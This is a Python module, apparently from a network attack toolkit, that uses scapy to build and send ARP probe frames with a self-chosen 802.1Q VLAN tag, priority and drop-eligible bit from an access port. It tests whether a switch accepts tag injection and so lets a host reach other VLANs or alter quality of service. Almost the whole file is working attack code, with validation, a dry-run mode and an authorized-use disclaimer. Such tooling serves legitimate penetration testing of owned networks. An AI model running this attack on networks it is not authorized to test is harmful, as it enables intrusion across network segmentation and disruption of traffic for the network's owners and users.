"""VLAN tag injection: insert an 802.1Q tag with chosen fields on an access port.

Access ports should carry untagged frames only. A frame that a host tags itself is
a tag injection: the host chooses the VLAN ID, the priority (PCP) and the drop
eligible bit (DEI). A switch that accepts such frames on an access port may place
them in the VLAN the tag names, and it may keep or rewrite the priority, which
affects quality of service on the path.

This module builds and sends tagged frames with those fields chosen. What the
switch does with them depends on its configuration.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import ARP, Dot1Q, Ether, sendp
from scapy.packet import Packet

from macabre.attacks.arp_spoofing import parse_ipv4
from macabre.attacks.common import BROADCAST_MAC, Runner, normalize_unicast_mac, read_interface_mac, run_command

ARP_REQUEST = 1
ZERO_IP = "0.0.0.0"
ZERO_MAC = "00:00:00:00:00:00"


@dataclass(frozen=True)
class VlanTagInjectionConfig:
    iface: str                  # attacker interface, on the access port under test
    vlan: int                   # VLAN ID written in the injected tag (1-4094)
    pcp: int = 0                # priority code point, 0-7
    dei: int = 0                # drop eligible indicator, 0 or 1
    probe_ip: str = "192.0.2.1" # address in the probe ARP request (documentation range by default)
    count: int = 0              # tagged probes to send; 0 = until stopped
    interval: float = 1.0       # seconds between probes
    dry_run: bool = False       # build probes but do not send them

    def __post_init__(self) -> None:
        if not 1 <= self.vlan <= 4094:
            raise ValueError("The VLAN must be between 1 and 4094.")
        if not 0 <= self.pcp <= 7:
            raise ValueError("The priority (PCP) must be between 0 and 7.")
        if self.dei not in (0, 1):
            raise ValueError("The DEI bit must be 0 or 1.")
        parse_ipv4(self.probe_ip, "probe IP")


@dataclass
class VlanTagInjectionStats:
    sender_mac: str = ""
    frames: int = 0
    status: str = ""


def build_injected_frame(sender_mac: str, vlan: int, pcp: int, dei: int, probe_ip: str) -> Packet:
    """ARP probe carrying an 802.1Q tag with the chosen VLAN, priority and DEI."""
    mac = normalize_unicast_mac(sender_mac)
    return (
        Ether(src=mac, dst=BROADCAST_MAC)
        / Dot1Q(vlan=vlan, prio=pcp, dei=dei)
        / ARP(op=ARP_REQUEST, hwsrc=mac, psrc=ZERO_IP, hwdst=ZERO_MAC, pdst=probe_ip)
    )


def run_vlan_tag_injection(
    config: VlanTagInjectionConfig,
    stop_event: threading.Event,
    on_progress: Callable[[VlanTagInjectionStats], None],
    run: Runner | None = None,
    send: Callable[..., Any] | None = None,
) -> VlanTagInjectionStats:
    """Send tagged probes until `count` or `stop_event`."""
    run = run or run_command
    send = send or sendp

    if config.dry_run:
        stats = VlanTagInjectionStats(
            status=f"Dry run: would inject tags for VLAN {config.vlan} (PCP {config.pcp}, DEI {config.dei}). "
                   "Nothing sent.",
        )
        on_progress(replace(stats))
        return stats

    sender_mac = read_interface_mac(config.iface, run)
    stats = VlanTagInjectionStats(sender_mac=sender_mac)
    while not stop_event.is_set() and (config.count == 0 or stats.frames < config.count):
        send(build_injected_frame(sender_mac, config.vlan, config.pcp, config.dei, config.probe_ip),
             iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
        stop_event.wait(config.interval)
    return stats
